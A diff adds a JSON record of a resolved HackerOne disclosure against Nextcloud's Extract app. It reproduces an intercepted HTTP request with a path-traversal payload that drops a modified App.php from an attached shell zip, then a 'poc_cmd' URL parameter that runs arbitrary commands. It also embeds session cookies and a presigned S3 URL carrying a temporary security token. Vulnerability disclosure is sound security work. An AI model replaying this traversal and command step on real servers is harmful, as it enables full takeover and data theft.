@@ -1,0 +1,141 @@
+{
+  "id": 765291,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NjUyOTE=",
+  "url": "https://hackerone.com/reports/765291",
+  "title": "Remote code execution via path traversal in Zip extraction in the Extract app",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-12-27T23:07:56.864Z",
+  "submitted_at": "2019-12-27T23:07:56.864Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "emilvirkki",
+    "url": "/emilvirkki",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-03-07T12:54:55.538Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2020-02-06T12:54:55.135Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I realise this doesn't qualify for a reward, as it's a vulnerability in a third-party app, but as the app is part of the \"official\" VM image provided by Hansson IT, I think it's well worth fixing.\n\nThe Extract app doesn't validate the path or filename of a zip file to be extracted, allowing an attacker to create or overwrite arbitrary files.\n\nHow to reproduce\n===\n\nInstall NextCloud using the VM image with default settings (with the extra security options).\n\nCreate a new user with no user group and log in as that user.\n\nUpload the payload zip file (nextcloud-shell.zip, attached) to the root folder (or wherever you like). It contains a modified version of apps/files/App.php, necessary for getting the payload to run.\n\nClick the \"Extract here\" option for the nextcloud-shell.zip and intercept the request. Modify the **request body** so the request looks something like the following. You need to replace \"normaluser\" with the username of the user you created in (2):\n\n```\nPOST /index.php/apps/extract/ajax/extractHere.php HTTP/1.1\nHost: 192.168.100.32\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: */*\nAccept-Language: fi-FI,fi;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nrequesttoken: lv0G5+K7v/a3w30wOMyR35SvBgF35GHmiuoejP+8u7g=:w5s+qIPUj8aAohdpWojkiazdVXYRkwyp47t8ypHy/+4=\nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nContent-Length: 55\nOrigin: https://192.168.100.32\nDNT: 1\nConnection: close\nCookie: ocmmdvtkydkx=1u2e2imt5h7g0pimv84eoqnfco; oc_sessionPassphrase=MXmMNXhcE3%2FpbZla9mKTYIS18lYG49cMP8lTHFrJfGe1jLxHd2hHfg8vYs1O6hFjv2IbkI31jhMeJnajKWNYzIb7G3f9UNiFmyKJwAbzPWLKY594ScipzPr6u%2BN9SUp3; __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; nc_username=normaluser; nc_token=FkBWj5z2dOJS0v4putAyW2oL7tAEOc9Q; nc_session_id=1u2e2imt5h7g0pimv84eoqnfco\n\nnameOfFile=../../../../../../mnt/ncdata/normaluser/files/nextcloud-shell.zip&directory=/../../../../var/www/nextcloud/apps/files/lib&external=0\n```\n\nOpen the following URL (replace host ip with your actual install) and observe how the current user and group are printed: `https://192.168.100.32/apps/files/?dir=/&poc_cmd=whoami`. You can obviously change the poc_cmd parameter to run any command you like.\n\n## Impact\n\nThe attacker can run any commands with the privileges of the www-data user. This allows the attacker to access and modify all the files and personally identifiable information in the installation.",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 670123,
+      "file_name": "nextcloud-shell.zip",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/5Mh2dyHyxTcwGZKe1fmocZ91?response-content-disposition=attachment%3B%20filename%3D%22nextcloud-shell.zip%22%3B%20filename%2A%3DUTF-8%27%27nextcloud-shell.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTUOKVM5L%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T133411Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2Bt0omVOHrZ9OL9Trk%2BdFKhBv%2FQrKC65W11rjrMgC%2F6QIhANia%2FTyBcfeu0XFctw1a%2FJDDLBAa34%2BWU%2F53rhxkz%2BKhKrEFCHUQAxoMMDEzNjE5Mjc0ODQ5IgxUKMbWt1VTh5nJA5MqjgWpIiqILEweaNhgRF6m1s3guYn11lerqJNrnFjeROxUEJywbXRrt%2FcAshROQMcI4IP1FF5kzaP6N8mOGtMrRL%2FiPu4S3YpijdtIekdCS1Sn6Snt4Sh4hrILW%2Bb8ze6H%2F8%2BUjG3tsefJ2i7e6RAZ95Jy%2FsR7Gyo717mGo8tT2xBovHwjfmR5eCTxEwySxWEQvCnkU8sWiVU4TVsVyZojCQaslBXYJlwFTmuq95Ka7nfTvMgKz2HKR%2BHa7dIsA2obOMA1gq914%2BAgrDq45xv0U8MzkvK2tpK9dfMSBVfPWAFHxIt5sREveo4mZ2nlBAm%2BX77TaBAPdROjeHNp2e8Y8GU73sHmCxPEQ6RVEBNo1Cpqin5nayoOUqgSikVBZNppJWCf78ZqDFx6xAksvybCUspLPt8UiXeCwawB4vSOwq1RhpGympS%2F4X%2BAfeB4Och%2Bx%2BOR8nKDDKe3Y%2BeIUIzmLq7R63lPB%2BEoYre1R8%2Bf%2F%2BYGK3IVaxII1oWPg4zPRX6SOnrZtXGjWyAfZ%2F6lNEUsc6rYsPzapeuVSlq%2FRTHQ%2BbWGOkn3wxqxzOCLbZSltQ7LZsPVDrrri2fFwWrFwoheZZCDY0vSRv08hDQ%2Fkq3xDInCDWZMeu%2FK40kiRmv6ehFATji5N1OJbLemuPO%2BTwvrdcBn9fQS4BkDMFIrGhE%2FuOwv61gkyL1fOapjm3KOWa8BmzAuFidAmAy%2BVnosQJMh3ckcvSXiD8sLINTU%2FbSsdV7beCmMpyf6fP3p%2F7VcwiGBABGo294shnTdhd2P0IxsSt7anyRTek2yB5NqzUYBr8WXNft2l3V3HTxgS9tRQXGp0RJdLlzDT1qxWJvF2JoUm4vQH5Pwhirc51bptu0N99Iwn6%2BtrgY6sAElrGju%2FXz82pDWWGfZvz6UL%2Fm95ZWtM25B7Ca5iNmiTQUqK%2BPhqtvh3TLN14mj%2BOXWFTSoPWS4IHLzNFsgx2J0aY83%2FElbkWzC43VwT7caBSFcI5aYu4krRCov2TutbftS11vV1dOme5hlM9%2Bf%2FlUY4xpo4dgVYdlW83DxHU%2BAO74ifhWVTZa4oAIO7OK8ImejZkl87d9LyTXqXHcY75D4o2LMg4shUYHjgRj5VB%2BvcA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b93372921a9c58e96bf49426d308eb1b707b10a01829ee684178dd08765924c4",
+      "file_size": 1094,
+      "type": "application/zip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-03-07T12:54:55.230Z",
+  "allow_singular_disclosure_after": -124245556.65675667,
+  "singular_disclosure_allowed": true,
+  "vote_count": 38,
+  "voters": [
+    "aituglo",
+    "saulius",
+    "a_d_a_m",
+    "yvvdwf",
+    "tess",
+    "az1441",
+    "h4x0r_dz",
+    "nkx",
+    "mayurudiniya",
+    "sodium_",
+    "and 28 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.8,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 42,
+    "asset_type": "URL",
+    "asset_identifier": "apps.nextcloud.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
